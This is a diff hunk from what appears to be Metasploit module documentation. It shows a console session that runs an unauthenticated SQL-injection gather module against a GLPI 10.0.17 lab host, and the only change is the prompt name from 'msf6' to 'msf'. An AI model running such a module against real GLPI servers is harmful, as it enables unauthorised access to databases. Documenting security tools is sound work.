@@ -129,10 +129,10 @@ The maximum  number of entries to dump from the database. More entries will incr
 ## Scenarios
 ### GLPI 10.0.17 running on Ubuntu 22.04
 ```
-msf6 > use gather/glpi_inventory_plugin_unauth_sqli
-msf6 auxiliary(gather/glpi_inventory_plugin_unauth_sqli) > set rhost 172.16.199.130
+msf > use gather/glpi_inventory_plugin_unauth_sqli
+msf auxiliary(gather/glpi_inventory_plugin_unauth_sqli) > set rhost 172.16.199.130
 rhost => 172.16.199.130
-msf6 auxiliary(gather/glpi_inventory_plugin_unauth_sqli) > exploit 
+msf auxiliary(gather/glpi_inventory_plugin_unauth_sqli) > exploit 
 [*] Reloading module...
 [*] Running module against 172.16.199.130
 [*] Running automatic check ("set AutoCheck false" to disable)
